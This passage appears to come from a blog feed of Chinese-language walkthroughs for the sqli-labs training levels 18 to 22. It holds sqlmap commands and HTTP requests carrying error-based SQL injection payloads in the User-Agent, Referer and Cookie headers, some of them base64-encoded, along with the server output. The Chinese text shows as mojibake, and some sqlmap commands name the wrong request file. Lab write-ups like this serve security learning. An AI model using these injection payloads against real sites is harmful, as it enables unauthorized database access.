è¯­å¥ï¼Œé¡ºåˆ©è®©æ•°æ®åº“æ‰§è¡Œæˆ‘ä»¬çš„ä»£ç å³å¯</p>\n<p>æ‹¿ database () è¿™é‡Œåˆ©ç”¨æŠ¥é”™æ³¨å…¥ï¼Œpayloadï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /Less-18/ HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0&#x27;,1,extractvalue(1,concat(&#x27;~&#x27;,database())))# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://www.sqli-labs.com/Less-18/Content-Type: application/x-www-form-urlencodedContent-Length: 34Origin: http://www.sqli-labs.comDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheuname=admin&amp;passwd=1&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>è¾“å‡ºï¼Œæ‹¿åˆ°å½“å‰æ•°æ®åº“ securityï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;br&gt;Your IP ADDRESS is: 127.0.0.1&lt;br&gt;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&lt;/font&gt;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;Your User Agent is: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0&#x27;,1,extractvalue(1,concat(&#x27;~&#x27;,database())))#&lt;/font&gt;&lt;br&gt;XPATH syntax error: &#x27;~security&#x27;&lt;br&gt;&lt;br&gt;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&lt;br&gt;</span><br></pre></td></tr></table></figure>\n<p>åé¢çˆ†å­—æ®µå€¼åŒ less-11ï¼Œæ”¹ä¸€ä¸‹ payload å³å¯</p>\n<h2 id=\"æ€»ç»“-18\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-18\">#</a> æ€»ç»“</h2>\n<p>çœ‹æºç ï¼Œå°±åƒè€ƒè¯•ä½œå¼Šï¼Œå¿ƒæ€€æ„§ç–šï½ï½ï¼ˆè·ƒè·ƒæ¬²è¯•ï¼‰~~</p>\n<ol>\n<li>level å‚æ•°ï¼š</li>\n</ol>\n<blockquote>\n<p>1 &gt; æ¢æµ‹ç­‰çº§ï¼š --level 5</p>\n<p>â€“level 5 æŒ‡çš„æ˜¯éœ€è¦æ‰§è¡Œçš„æµ‹è¯•ç­‰çº§</p>\n<p>ä¸€å…±æœ‰ 5 ä¸ªç­‰çº§ï¼ˆ1-5ï¼‰ ä¸åŠ  level æ—¶ï¼Œé»˜è®¤æ˜¯ 1</p>\n<p>5 çº§åŒ…å«çš„ payload æœ€å¤šï¼Œä¼šè‡ªåŠ¨ç ´è§£å‡º cookieã€XFF ç­‰å¤´éƒ¨æ³¨å…¥ï¼Œç›¸å¯¹åº”ä»–çš„é€Ÿåº¦ä¹Ÿæ¯”è¾ƒæ…¢ã€‚</p>\n<p>level=2 http cookie ä¼šæµ‹è¯•</p>\n<p>level=3 http user-agent/referer å¤´ä¼šæµ‹è¯•</p>\n<p>åœ¨ä¸èƒ½ç¡®å®šå“ªä¸ª payload æˆ–å‚æ•°ä¸ºæ³¨å…¥ç‚¹æ—¶ï¼Œå»ºè®®ä½¿ç”¨é«˜çš„ level å€¼ã€‚</p>\n</blockquote>\n<hr>\n<h1 id=\"less-19\"><a class=\"markdownIt-Anchor\" href=\"#less-19\">#</a> Less-19</h1>\n<p>dateï¼š2020-11-22 10:01:30</p>\n<h2 id=\"è¿‡ç¨‹-19\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-19\">#</a> è¿‡ç¨‹</h2>\n<h3 id=\"sqlmap-19\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-19\">#</a> sqlmap</h3>\n<p>bp æŠ“åŒ…å³é”® copy to file ç”Ÿæˆ 19.txt</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python sqlmap.py -r 19.txt --level=5 --risk=3 --dbs --batch</span><br></pre></td></tr></table></figure>\n<p>åç»­åŒ less-11</p>\n<h3 id=\"æ‰‹å·¥æ³¨å…¥-19\"><a class=\"markdownIt-Anchor\" href=\"#æ‰‹å·¥æ³¨å…¥-19\">#</a> æ‰‹å·¥æ³¨å…¥</h3>\n<p>çœ‹æ ‡é¢˜ï¼Œreferer æ³¨å…¥ï¼Œçœ‹æ¥åé¢çš„é¢˜ç›®éƒ½æ˜¯å¤´æ³¨å…¥äº†</p>\n<p>æ‰“å¼€ hackbarï¼Œç‚¹å‡» post dataï¼Œè¾“å…¥æ­£ç¡®çš„ç”¨æˆ·åå¯†ç ï¼Œæç¤ºæˆ‘çš„ referer æ˜¯å•¥å•¥å•¥ï¼Œå†æ¬¡ç¡®å®šå°±æ˜¯ referer å¤´æ³¨å…¥</p>\n<p>ä¸çŸ¥é“ä¸ºå•¥ hackbar åŒæ—¶æ postdata å’Œ refererï¼Œreferer æ²¡æœ‰èµ·ä½œç”¨ï¼Œä¸Š bpï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /Less-19/ HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://www.sqli-labs.com/Less-19/&#x27;Content-Type: application/x-www-form-urlencodedContent-Length: 34Origin: http://www.sqli-labs.comDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheuname=admin&amp;passwd=1&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>è¾“å‡ºï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;br&gt;Your IP ADDRESS is: 127.0.0.1&lt;br&gt;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&lt;/font&gt;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;Your Referer is: http://www.sqli-labs.com/Less-19/&#x27;&lt;/font&gt;&lt;br&gt;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;127.0.0.1&#x27;)&#x27; at line 1&lt;br&gt;&lt;br&gt;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&lt;br&gt;</span><br></pre></td></tr></table></figure>\n<p>åˆæ˜¯ insert æ“ä½œå•¦ï¼Œåˆ©ç”¨æŠ¥é”™æ³¨å…¥ extractvalue () æ‹¿å½“å‰æ•°æ®åº“å</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /Less-19/ HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://www.sqli-labs.com/Less-19/&#x27;, extractvalue(1,concat(&#x27;~&#x27;,database()))) # Content-Type: application/x-www-form-urlencodedContent-Length: 35Origin: http://www.sqli-labs.comDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheuname=admin&amp;passwd=1&amp;submit=Submit </span><br></pre></td></tr></table></figure>\n<p>æ ¹æ®è¾“å‡ºï¼Œæ‹¿åˆ°å½“å‰æ•°æ®åº“å securityï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;br&gt;Your IP ADDRESS is: 127.0.0.1&lt;br&gt;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&lt;/font&gt;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;Your Referer is: http://www.sqli-labs.com/Less-19/&#x27;, extractvalue(1,concat(&#x27;~&#x27;,database()))) #&lt;/font&gt;&lt;br&gt;XPATH syntax error: &#x27;~security&#x27;&lt;br&gt;&lt;br&gt;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&lt;br&gt;</span><br></pre></td></tr></table></figure>\n<p>åç»­æ“ä½œåŒ less-11</p>\n<h2 id=\"æ€»ç»“-19\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-19\">#</a> æ€»ç»“</h2>\n<p>sqlmap æ–°æ“ä½œï¼Œæ„Ÿè§‰å®ƒä¸å¤ªè¡Œäº†ï¼Ÿåº”è¯¥æ˜¯æˆ‘ä¸å¤ªè¡Œï¼Œå»ç™¾åº¦ sqlmap çš„ä½¿ç”¨å§¿åŠ¿</p>\n<hr>\n<h1 id=\"less-20\"><a class=\"markdownIt-Anchor\" href=\"#less-20\">#</a> Less-20</h1>\n<p>dateï¼š2020-11-22 10:17:02</p>\n<h2 id=\"è¿‡ç¨‹-20\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-20\">#</a> è¿‡ç¨‹</h2>\n<h3 id=\"sqlmap-20\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-20\">#</a> sqlmap</h3>\n<p>bp æŠ“åŒ…å³é”® copy to file ç”Ÿæˆ 20.txt</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python sqlmap.py -r 22.txt --level=5 --risk=3 --dbs --batch</span><br></pre></td></tr></table></figure>\n<p>åç»­åŒ less-11</p>\n<h3 id=\"æ‰‹å·¥æ³¨å…¥-20\"><a class=\"markdownIt-Anchor\" href=\"#æ‰‹å·¥æ³¨å…¥-20\">#</a> æ‰‹å·¥æ³¨å…¥</h3>\n<p>å…ˆç”¨ admin\\1 ç™»å½•</p>\n<p>é¢˜ç›®ç»™äº†æˆ‘çš„ cookieï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">YOUR USER AGENT IS : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0YOUR IP ADDRESS IS : 127.0.0.1DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIREYOUR COOKIE : uname = admin and expires: Sun 22 Nov 2020 - 11:22:50Your Login name:adminYour Password:1Your ID:8</span><br></pre></td></tr></table></figure>\n<p>é‚£å°± cookie æ³¨å…¥å‘—ï¼Œbp æŠ“åŒ…</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /Less-20/index.php HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://www.sqli-labs.com/Less-20/index.phpDNT: 1Connection: closeCookie: uname=adminUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cache</span><br></pre></td></tr></table></figure>\n<p>cookie åå•å¼•å·å¼€æˆ˜</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Cookie: uname=admin&#x27;</span><br></pre></td></tr></table></figure>\n<p>è¾“å‡ºï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;Issue with your mysql: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;admin&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>\n<p>åé¢çš„ sql æ©˜å­æ‹¿åˆ°äº†ï¼Œå°±å¼€å§‹å¸¸è§„å§¿åŠ¿é—­åˆï¼Œæ‹¿ database ()</p>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Cookie: uname=admin&#x27; and extractvalue(1,concat(&#x27;~&#x27;,database())) # </span><br></pre></td></tr></table></figure>\n<p>è¾“å‡ºï¼Œæ‹¿åˆ°åº“å securityï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Issue with your mysql: XPATH syntax error: &#x27;~security&#x27;</span><br></pre></td></tr></table></figure>\n<p>æ‹¿å­—æ®µå†…å®¹åŒ less-11</p>\n<h2 id=\"æ€»ç»“-20\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-20\">#</a> æ€»ç»“</h2>\n<p>æŠ¥é”™æ³¨å…¥çœŸå¥½ç”¨</p>\n<p>å‰é¢å†™äº†é¢˜ï¼Œåé¢å°±è¶Šå†™è¶Šå¿«äº†ï¼Œå¼€å¿ƒ</p>\n<hr>\n<h1 id=\"less-21\"><a class=\"markdownIt-Anchor\" href=\"#less-21\">#</a> Less-21</h1>\n<p>dateï¼š2020-11-22 10:29:18</p>\n<h2 id=\"è¿‡ç¨‹-21\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-21\">#</a> è¿‡ç¨‹</h2>\n<h3 id=\"sqlmap-21\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-21\">#</a> sqlmap</h3>\n<p>bp æŠ“åŒ…å³é”® copy to file ç”Ÿæˆ 21.txt</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python sqlmap.py -r 22.txt --level=5 --risk=3 --dbs --batch</span><br></pre></td></tr></table></figure>\n<p>åç»­åŒ less-11</p>\n<h3 id=\"æ‰‹å·¥æ³¨å…¥-21\"><a class=\"markdownIt-Anchor\" href=\"#æ‰‹å·¥æ³¨å…¥-21\">#</a> æ‰‹å·¥æ³¨å…¥</h3>\n<p>è€è§„çŸ©ï¼Œè¾“å…¥ 17 å…³é‡ç½®åçš„è´¦æˆ·å¯†ç  admin/1</p>\n<p>é¢˜ç›®è¿˜æ˜¯ cookie æ³¨å…¥ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">YOUR USER AGENT IS : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0YOUR IP ADDRESS IS : 127.0.0.1DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIREYOUR COOKIE : uname = YWRtaW4= and expires: Sun 22 Nov 2020 - 11:29:55Your Login name:adminYour Password:1Your ID:8</span><br></pre></td></tr></table></figure>\n<p>çœ‹æ ‡é¢˜æ˜¯å¤æ‚ç‰ˆçš„â€¦</p>\n<p>å•Šè¿™ï¼Œå…ˆè¯•è¯•å¼•å·ï¼Œç«Ÿç„¶ä¸æŠ¥é”™äº†ï¼</p>\n<p>æœ‰è¶£</p>\n<p>çœ‹äº†ä¸‹é¢˜ç›® uname é‚£é‡Œå‘ç”Ÿäº†æ”¹å˜ï¼ŒæŠ“åŒ…å‘ç° uname æ˜¯ YWRtaW4ï¼Œæ”¹æˆ admin è¯•è¯•</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Cookie: uname=admin&quot;</span><br></pre></td></tr></table></figure>\n<p>è¾“å‡º</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;Issue with your mysql: Illegal mix of collations (gbk_chinese_ci,IMPLICIT) and (latin1_swedish_ci,COERCIBLE) for operation &#x27;=&#x27;</span><br></pre></td></tr></table></figure>\n<p>è¯´æ˜¯ç¼–ç é›†çš„é—®é¢˜ï¼Œå¥½å­æˆ‘å»ç™¾åº¦<a href=\"https://www.cnblogs.com/escwq/p/12264076.html\">é—¯å…³ç§˜ç±äº†</a></p>\n<p>å¯¹ cookie çš„å€¼è¿›è¡Œäº† base64 çš„å¤„ç†ï¼Œå…¶ä»–å’Œ 20 å…³ä¸€æ ·</p>\n<p>ä¹Ÿå°±æ˜¯è¯´åœ¨æ³¨å…¥çš„æ—¶å€™éœ€è¦æŠŠæ³¨å…¥è¯­å¥æä¸€ä¸‹ç¼–ç ï¼Œæ‰“å¼€ hackbarï¼Œæ‰“å¼€ base64 ç¼–ç ï¼Œè¾“å…¥ adminâ€™</p>\n<p>bp å‘åŒ…è®¾ç½® cookie</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Cookie: uname=YWRtaW4n</span><br></pre></td></tr></table></figure>\n<p>è¾“å‡ºï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;Issue with your mysql: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;admin&#x27;&#x27;) LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>\n<p>æ‹¿åˆ°åé¢çš„å¥å­ï¼Œå¼€å§‹é—­åˆæ³¨å…¥ï¼Œä¸çŸ¥ä¸ºä½•æˆ‘è½¬ä¹‰åçš„æŠ¥é”™æ³¨å…¥ä»£ç æ”¾è¿› payload æ²¡æœ‰ååº”ï¼Œæ¢ä¸€ä¸ªåŠ å¯†å·¥å…·å°±å¥½äº†</p>\n<p>ç”¨æŠ¥é”™æ³¨å…¥æ‹¿æ•°æ®</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">æ˜æ–‡ï¼šadmin&#x27;) and extractvalue(1,concat(&#x27;,&#x27;,database())) # base64è½¬ä¹‰ï¼šYWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KCcsJyxkYXRhYmFzZSgpKSkgIyA=è®¾ç½®cookieï¼šCookie: uname=YWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KCcsJyxkYXRhYmFzZSgpKSkgIyA=</span><br></pre></td></tr></table></figure>\n<p>è¾“å‡ºï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;YOUR COOKIE : uname = YWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KCcsJyxkYXRhYmFzZSgpKSkgIyA= and expires: Sun 22 Nov 2020 - 12:30:51&lt;br&gt;&lt;/font&gt;Issue with your mysql: XPATH syntax error: &#x27;,security&#x27;</span><br></pre></td></tr></table></figure>\n<p>æ‹¿åˆ°æ•°æ®åº“åï¼Œæ‹¿åˆ«çš„æ•°æ®åŒ less-11</p>\n<h2 id=\"æ€»ç»“-21\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-21\">#</a> æ€»ç»“</h2>\n<p><a href=\"https://blog.csdn.net/makenothing/article/details/81155960\">base64 ä½¿ç”¨åœºæ™¯åŠåŸç†</a></p>\n<p>base64 æœ€æ—©å°±æ˜¯ç”¨æ¥é‚®ä»¶ä¼ è¾“åè®®ä¸­çš„ï¼ŒåŸå› æ˜¯é‚®ä»¶ä¼ è¾“åè®®åªæ”¯æŒ ascii å­—ç¬¦ä¼ é€’ï¼Œå› æ­¤å¦‚æœè¦ä¼ è¾“äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¦‚ï¼šå›¾ç‰‡ã€è§†é¢‘æ˜¯æ— æ³•å®ç°çš„ã€‚</p>\n<p>å› æ­¤ base64 å°±å¯ä»¥ç”¨æ¥å°†äºŒè¿›åˆ¶æ–‡ä»¶å†…å®¹ç¼–ç ä¸ºåªåŒ…å« ascii å­—ç¬¦çš„å†…å®¹ã€‚</p>\n<p>æˆ‘ä»¬çŸ¥é“åœ¨è®¡ç®—æœºä¸­ä»»ä½•æ•°æ®éƒ½æ˜¯æŒ‰ ascii ç å­˜å‚¨çš„ï¼Œè€Œ ascii ç çš„ 128ï½255 ä¹‹é—´çš„å€¼æ˜¯ä¸å¯è§å­—ç¬¦ã€‚è€Œåœ¨ç½‘ç»œä¸Šäº¤æ¢æ•°æ®æ—¶ï¼Œæ¯”å¦‚è¯´ä» A åœ°ä¼ åˆ° B åœ°ï¼Œå¾€å¾€è¦ç»è¿‡å¤šä¸ªè·¯ç”±è®¾å¤‡ï¼Œç”±äºä¸åŒçš„è®¾å¤‡å¯¹å­—ç¬¦çš„å¤„ç†æ–¹å¼æœ‰ä¸€äº›ä¸åŒï¼Œè¿™æ ·é‚£äº›ä¸å¯è§å­—ç¬¦å°±æœ‰å¯èƒ½è¢«å¤„ç†é”™è¯¯ï¼Œè¿™æ˜¯ä¸åˆ©äºä¼ è¾“çš„ã€‚æ‰€ä»¥å°±å…ˆæŠŠæ•°æ®å…ˆåšä¸€ä¸ª Base64 ç¼–ç ï¼Œç»Ÿç»Ÿå˜æˆå¯è§å­—ç¬¦ï¼Œè¿™æ ·å‡ºé”™çš„å¯èƒ½æ€§å°±å¤§é™ä½äº†ã€‚</p>\n<hr>\n<h1 id=\"less-22\"><a class=\"markdownIt-Anchor\" href=\"#less-22\">#</a> Less-22</h1>\n<p>dateï¼š2020-11-22 11:35:53</p>\n<h2 id=\"è¿‡ç¨‹-22\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-22\">#</a> è¿‡ç¨‹</h2>\n<h3 id=\"sqlmap-22\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-22\">#</a> sqlmap</h3>\n<p>bp æŠ“åŒ…å³é”® copy to file ç”Ÿæˆ 22.txt</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python sqlmap.py -r 22.txt --level=5 --risk=3 --dbs --batch</span><br></pre></td></tr></table></figure>\n<p>åç»­åŒ less-11</p>\n<h3 id=\"æ‰‹å·¥æ³¨å…¥-22\"><a class=\"markdownIt-Anchor\" href=\"#æ‰‹å·¥æ³¨å…¥-22\">#</a> æ‰‹å·¥æ³¨å…¥</h3>\n<p>è¿˜æ˜¯ç”¨ admin\\1 ç™»å½•ï¼Œæ˜¾ç¤º cookieï¼Œé‚£å°±è¿˜æ˜¯ cookie æ³¨å…¥</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">YOUR USER AGENT IS : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0YOUR IP ADDRESS IS : 127.0.0.1DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIREYOUR COOKIE : uname = YWRtaW4= and expires: Sun 22 Nov 2020 - 12:37:26Your Login name:adminYour Password:1Your ID:8</span><br></pre></td></tr></table></figure>\n<p>çœ‹è§ uname = YWRtaW4= ï¼Œé‚£å°±åº”è¯¥è¿˜æ˜¯ç”¨ base64 åŠ å¯†</p>\n<p>ä½¿ç”¨ä¸Šä¸€é¢˜çš„ payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">æ˜æ–‡ï¼šadmin&#x27;) and extractvalue(1,concat(&#x27;,&#x27;,database())) # base64ï¼šYWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KCcsJyxkYXRhYmFzZSgpKSkgIyA=</span><br></pre></td></tr></table></figure>\n<p>å‘ç°æ²¡æœ‰æŠ¥é”™æ˜¾ç¤ºï¼Œé‚£ä¹ˆè¯´æ˜æ²¡æœ‰é—­åˆæˆåŠŸï¼Œçœ‹æ ‡é¢˜æ˜¯åŒå¼•å·é—­åˆï¼Œé‚£å°±æ”¹ä¸€ä¸‹å¼•å·</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">æ˜æ–‡ï¼šadmin&quot;) and extractvalue(1,concat(&#x27;,&#x27;,database())) # base64ï¼šYWRtaW4iKSBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KCcsJyxkYXRhYmFzZSgpKSkgIyA=</span><br></pre></td></tr></table></figure>\n<p>è¾“å‡ºï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Issue with your mysql: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;) and extractvalue(1,concat(&#x27;,&#x27;,database())) # &quot; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>\n<p>å“ªåˆ°åé¢çš„ sql è¯­å¥ï¼Œå‘ç°åªéœ€è¦é—­åˆä¸€ä¸ªåŒå¼•å·ï¼Œä¸éœ€è¦ï¼‰ï¼Œå¼€å¹²</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">æ˜æ–‡ï¼šadmin&quot; and extractvalue(1,concat(&#x27;,&#x27;,database())) # base64ï¼šYWRtaW4iIGFuZCBleHRyYWN0dmFsdWUoMSxjb25jYXQoJywnLGRhdGFiYXNlKCkpKSAjIA==</span><br></pre></td></tr></table></figure>\n<p>è¾“å‡ºï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Issue with your mysql: XPATH syntax error: &#x27;,security&#x27;</span><br></pre></td></tr></table></figure>\n<p>æ‹¿åˆ°æ•°æ®åº“åï¼Œæ‹¿åˆ«çš„æ•°æ®åŒ less-11</p>\n<h2 id=\"æ€»ç»“-22\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-22\">#</a> æ€»ç»“</h2>\n<p>æˆ‘å‘ç° sqlmap è·‘å¾—æœ‰ä¸€ç‚¹æ…¢</p>\n",
            "tags": [
                "sqlæ³¨å…¥é¶åœº"
            ]
        },
        {
            "id": "http://example.com/2020/10/30/dmx/pikachu%E5%A4%A7%E5%86%92%E9%99%A9%E9%B8%AD/",
            "url": "http://example.com/2020/10/30/dmx/pikachu%E5%A4%A7%E5%86%92%E9%99%A9%E9%B8%AD/",
            "title": "pikachuå¤§å†’é™©é¸­",
            "date_published": "2020-10-30T03:46:05.000Z",
            "content_html": "<h1 id=\"sqlæ³¨å…¥\"><a class=\"markdownIt-Anchor\" href=\"#sqlæ³¨å…¥\">#</a> SQL æ³¨å…¥</h1>\n<h2 id=\"æœç´¢å‹æ³¨å…¥\"><a class=\"markdownIt-Anchor\" href=\"#æœç´¢å‹æ³¨å…¥\">#</a> æœç´¢å‹æ³¨å…¥</h2>\n<p><strong>è¿‡ç¨‹</strong></p>\n<p><img src=\"pikachu-sql-001.png\" alt=\"\"></p>\n<p>çˆ†å‡ºæ•°æ®åº“ï¼Œç¡®å®šäº†æ˜¯ä¸‰ä¸ªå­—æ®µè¾“å‡º<img src=\"pikachu-sql-002.png\" alt=\"\"></p>\n<hr>\n<h2 id=\"xxå‹æ³¨å…¥\"><a class=\"markdownIt-Anchor\" href=\"#xxå‹æ³¨å…¥\">#</a> xx å‹æ³¨å…¥</h2>\n<p><strong>è¿‡ç¨‹</strong></p>\n<p>æˆ‘æ˜¯æƒ³çœ‹æŠ¥é”™ä¿¡æ¯çš„ï¼Œä¸‰ä¸ªå•å¼•å·ï¼Œç»“æœè«åå…¶å¦™å°±è¿‡äº†</p>\n<p>pyloadï¼š<a href=\"http://www.pikachu.com/vul/sqli/sqli_x.php\">http://www.pikachu.com/vul/sqli/sqli_x.php</a><br>\n?name=â€™â€™â€™) union select 1,database() 